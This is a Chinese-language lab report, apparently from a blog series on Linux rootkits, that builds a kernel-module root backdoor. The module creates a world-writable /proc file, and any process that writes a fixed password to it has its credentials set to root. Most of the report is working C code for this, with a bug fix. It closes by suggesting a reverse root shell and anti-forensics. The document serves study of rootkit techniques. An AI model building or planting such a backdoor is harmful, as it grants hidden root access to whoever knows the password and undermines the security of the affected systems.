---
category: rootkit
title: Linux Rootkit 实验 | 00021 Rootkit 基本功能实现xROOT后门
---

# {{ page.title }}

> 时人不识凌云木，直待凌云始道高。

## 实验说明

本次实验将初步实现 rootkit 的基本功能：

- 阻止其他内核模块加载
- 提供 root 后门
- 隐藏文件
- 隐藏进程
- 隐藏端口
- 隐藏内核模块

本次实验基于 0001 实验中学习的挂钩技术。

注：由于本次实验内容过多，故分为`00020`到`00025`六个实验报告分别讲解。

**本节实现“提供 root 后门”功能**

## 实验环境

```
uname -a:
Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux

GCC version:6.1.1
```

上述环境搭建于虚拟机，另外在没有特殊说明的情况下，均以 root 权限执行。

**注：后面实验参考的是4.10.10的源码**

## 实验过程

### 提供 root 后门

这个后门参考之前很火的“全志科技”使用的代码。

简单来说，是这样：我们在`/proc`下创建一个文件，任何进程往其中写入特定的口令，我们就把它提升为`root`权限（把`uid`和`euid`等设为`0`）。

**这个文件可以用本系列后面的“隐藏文件”实验的方法隐藏掉。**

使用到的 API 是`proc_create`和`proc_remove`：

{% highlight c %}
// include/linux/proc_fs.h
// 参数分别是：文件名/访问模式/父目录/文件操作函数结构体
static inline struct proc_dir_entry *proc_create(
	const char *name, umode_t mode, struct proc_dir_entry *parent,
	const struct file_operations *proc_fops)
{
	return proc_create_data(name, mode, parent, proc_fops, NULL);
}
// fs/proc/generic.c
void proc_remove(struct proc_dir_entry *de)
{
	if (de)
		remove_proc_subtree(de->name, de->parent);
}
{% endhighlight %}

我们跟进看一下`struct file_operations`：

{% highlight c %}
// include/linux/fs.h
struct file_operations {
	struct module *owner;
	loff_t (*llseek) (struct file *, loff_t, int);
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);
	ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);
	int (*iterate) (struct file *, struct dir_context *);
	int (*iterate_shared) (struct file *, struct dir_context *);
	unsigned int (*poll) (struct file *, struct poll_table_struct *);
	long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
	long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
	int (*mmap) (struct file *, struct vm_area_struct *);
	int (*open) (struct inode *, struct file *);
	int (*flush) (struct file *, fl_owner_t id);
	int (*release) (struct inode *, struct file *);
	int (*fsync) (struct file *, loff_t, loff_t, int datasync);
	int (*fasync) (int, struct file *, int);
	int (*lock) (struct file *, int, struct file_lock *);
	ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);
	unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
	int (*check_flags)(int);
	int (*flock) (struct file *, int, struct file_lock *);
	ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);
	ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);
	int (*setlease)(struct file *, long, struct file_lock **, void **);
	long (*fallocate)(struct file *file, int mode, loff_t offset,
			  loff_t len);
	void (*show_fdinfo)(struct seq_file *m, struct file *f);
#ifndef CONFIG_MMU
	unsigned (*mmap_capabilities)(struct file *);
#endif
	ssize_t (*copy_file_range)(struct file *, loff_t, struct file *,
			loff_t, size_t, unsigned int);
	int (*clone_file_range)(struct file *, loff_t, struct file *, loff_t,
			u64);
	ssize_t (*dedupe_file_range)(struct file *, u64, u64, struct file *,
			u64);
};
{% endhighlight %}

其中是各种函数指针。我们目前只用到写操作处理函数：

{% highlight c %}
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
{% endhighlight %}

**下面开始行动！**

{% highlight c %}
// 声明写处理函数并放入结构体
ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp);

struct file_operations proc_fops = {
    .write = write_handler
};

// 定义写处理函数
#define AUTH "00100011F"
ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp)
{
    char *kbuff;
    struct cred* cred;

    // 分配内存。
    kbuff = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuff) {
        return -ENOMEM;
    }

    // 复制到内核缓冲区。
    if (copy_from_user(kbuff, buff, count)) {
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = (char)0;

    if (strlen(kbuff) == strlen(AUTH) &&
        strncmp(AUTH, kbuff, count) == 0) {

        // 用户进程写入的内容是我们的口令或者密码，
        // 把进程的 ``uid`` 与 ``gid`` 等等
        // 都设置成 ``root`` 账号的，将其提权到 ``root``。
        printk("%s\n", "Comrade, I will help you.");
        cred = (struct cred *)__task_cred(current);
        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        printk("%s\n", "See you!");
    } else {
        // 密码错误，拒绝提权。
        printk("Alien, get out of here: %s.\n", kbuff);
    }

    kfree(kbuff);
    return count;
}
{% endhighlight %}

最后，添加全局变量`struct proc_dir_entry *entry`，并分别在入口函数/出口函数中创建/删除我们的文件：

{% highlight c %}
#define NAME "JUSTFORFUN"
struct proc_dir_entry *entry;
// in init
entry = proc_create(NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);
// in exit
proc_remove(entry);
{% endhighlight %}

测试结果如下：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-8.png)

## 实验总结与思考

- 内核中的事情，真的是要细心。顺着 FreeBuf 的文章往下看时，`kbuff = kmalloc(count, GFP_KERNEL);`这个地方少分配了一个尾零。事实上应该是`kbuff = kmalloc(count + 1, GFP_KERNEL);`

- 另外注意：

是

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-7-err3.png)

而不是

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-7-err4.png)

- 个人以为 rootkit 应该提供一个能够远程连接的 root shell（对于内网的机器，用 reverse shell 是不是更好），并具备痕迹清理、自我删除甚至更强的反取证功能（另外，是否需要隐藏当前登录用户？）

## 参考资料

**已参考**

- [allwinner-zh/linux-3.4-sunxi](https://github.com/allwinner-zh/linux-3.4-sunxi/blob/bd5637f7297c6abf78f93b31fc1dd33f2c1a9f76/arch/arm/mach-sunxi/sunxi-debug.c#L41)

**拓展阅读**

- [This is what a root debug backdoor in a Linux kernel looks like](http://www.theregister.co.uk/2016/05/09/allwinners_allloser_custom_kernel_has_a_nasty_root_backdoor/)
